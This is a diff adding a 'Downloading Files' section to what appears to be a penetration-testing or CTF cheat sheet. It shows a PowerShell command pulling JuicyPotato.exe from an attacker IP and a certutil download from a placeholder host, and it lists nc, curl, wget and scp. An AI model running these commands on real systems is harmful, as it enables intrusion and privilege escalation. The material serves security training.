@@ -1,3 +1,18 @@
+# Downloading Files
+```
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.41:8000/JuicyPotato.exe','C:/Users/kohsuke/Desktop/JuicyPotato.exe')"
+
+certutil -urlcache -f http://YOUR_IP:PORT/filename.exe renamed.exe
+
+nc
+
+curl
+
+wget
+
+scp
+```
+
 # Metasploit Windows Reverse Shell
 
 ```
